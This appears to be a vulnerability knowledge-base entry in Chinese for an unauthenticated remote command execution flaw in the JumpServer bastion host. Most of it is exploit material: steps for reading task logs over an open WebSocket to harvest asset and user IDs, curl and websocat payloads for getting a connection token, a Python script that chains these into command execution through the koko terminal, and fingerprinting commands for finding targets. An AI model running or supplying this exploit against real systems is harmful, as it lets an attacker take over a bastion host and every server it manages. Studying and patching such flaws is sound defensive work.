---
id: JUMPSERVER-UNAUTH-RCE
title: JumpServer 未授权接口远程命令执行漏洞
product: jumpserver
vendor: JumpServer
version_affected: "< v2.6.2, < v2.5.4, < v2.4.5, = v1.5.9"
severity: CRITICAL
tags: [rce, auth_bypass, 无需认证]
fingerprint: ["JumpServer", "jumpserver", "FIT2CLOUD"]
---

## 漏洞描述

JumpServer 堡垒机某些接口未做授权限制，攻击者可通过未认证的 WebSocket 连接读取日志文件获取资产/用户 ID，然后请求连接 Token，最终通过 koko 终端执行任意命令，控制堡垒机管理的所有资产。

## 影响版本

- JumpServer < v2.6.2
- JumpServer < v2.5.4
- JumpServer < v2.4.5
- JumpServer v1.5.9

## 前置条件

- 无需认证
- JumpServer Web 端口可访问
- 目标已配置资产和系统用户

## 利用步骤

1. 通过未认证的 WebSocket `/ws/ops/tasks/log/` 读取任务日志
2. 从日志中提取 asset_id 和 system_user_id
3. 调用 `/api/v1/perms/asset-permissions/user/actions/` 获取权限
4. 请求 `/api/v1/authentication/connection-token/` 获取连接 Token
5. 通过 koko WebSocket `/koko/ws/token/` 连接终端执行命令

## Payload

### 读取日志获取 ID

```bash
# WebSocket 连接读取日志（使用 websocat 工具）
websocat "ws://target/ws/ops/tasks/log/" --no-close
# 发送 task_id 获取日志内容
```

### 获取连接 Token

```bash
curl -s "http://target/api/v1/authentication/connection-token/?user-only=None" \
  -H "Content-Type: application/json" \
  -d '{"user":"USER_ID","asset":"ASSET_ID","system_user":"SYSTEM_USER_ID"}'
```

### Python 自动化利用

```python
import asyncio, websockets, requests, json

target = "http://target"
ws_url = "ws://target"

# 1. 通过 WebSocket 读取日志获取 ID
async def get_ids():
    async with websockets.connect(f"{ws_url}/ws/ops/tasks/log/") as ws:
        await ws.send(json.dumps({"task": "TASK_ID"}))
        while True:
            msg = await ws.recv()
            print(msg)  # 从中提取 asset_id, system_user_id

# 2. 获取连接 Token
def get_token(user_id, asset_id, sys_user_id):
    r = requests.post(f"{target}/api/v1/authentication/connection-token/?user-only=None",
        json={"user": user_id, "asset": asset_id, "system_user": sys_user_id})
    return r.json().get("token")

# 3. 通过 koko 执行命令
async def exec_cmd(token, cmd):
    async with websockets.connect(f"{ws_url}/koko/ws/token/?target_id={token}") as ws:
        await ws.send(json.dumps({"type": "resize", "cols": 80, "rows": 24}))
        await ws.send(cmd + "\r")
        result = await ws.recv()
        print(result)
```

## 验证方法

```bash
# 检查未授权 WebSocket 是否可连接
curl -s "http://target/api/v1/authentication/connection-token/" -o /dev/null -w "%{http_code}"
# 返回非 401/403 表示接口存在认证缺陷
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "JumpServer\|jumpserver"
```

## 参考链接

- https://github.com/jumpserver/jumpserver/issues/6723
